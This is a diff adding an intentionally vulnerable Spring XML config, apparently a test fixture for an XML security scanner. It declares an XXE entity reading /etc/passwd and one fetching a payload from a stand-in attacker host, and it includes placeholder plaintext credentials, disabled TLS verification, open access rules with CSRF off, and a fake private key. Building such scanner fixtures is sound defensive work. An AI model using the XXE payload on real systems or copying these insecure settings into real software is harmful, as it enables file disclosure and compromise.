@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- scan-xml-security fixture — Intentionally vulnerable — do not deploy -->
+
+<!DOCTYPE beans [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY remote SYSTEM "https://attacker.example.invalid/payload">
+]>
+
+<beans xmlns="http://www.springframework.org/schema/beans">
+
+  <!-- XXE payload reference -->
+  <description>&xxe;</description>
+
+  <!-- Plaintext credentials in XML config -->
+  <bean id="dataSource" class="org.apache.commons.dbcp.BasicDataSource">
+    <property name="url"      value="jdbc:mysql://prod-db:3306/appdb"/>
+    <property name="username" value="admin"/>
+    <property name="password" value="xml_DB_PASS_12345"/>
+  </bean>
+
+  <!-- API key and secret in element text -->
+  <bean id="apiClient">
+    <property name="apiKey"    value="xml_API_KEY_12345"/>
+    <property name="secret"    value="xml_SECRET_12345"/>
+    <property name="token">
+      <value>xml_TOKEN_12345</value>
+    </property>
+  </bean>
+
+  <!-- TLS verification disabled -->
+  <bean id="httpClient" class="org.apache.http.impl.client.HttpClientBuilder">
+    <property name="sslVerification" value="false"/>
+    <property name="trustAllCertificates" value="true"/>
+  </bean>
+
+  <!-- Security constraints disabled -->
+  <security:http security="none" pattern="/admin/**"/>
+  <security:http auto-config="true">
+    <security:intercept-url pattern="/**" access="permitAll"/>
+    <security:csrf disabled="true"/>
+  </security:http>
+
+  <!-- Private key material inline -->
+  <bean id="signingKey">
+    <property name="keyValue">
+      <value>-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA0EXAMPLE_FAKE_KEY_FIXTURE_ONLY
+-----END RSA PRIVATE KEY-----</value>
+    </property>
+  </bean>
+
+</beans>
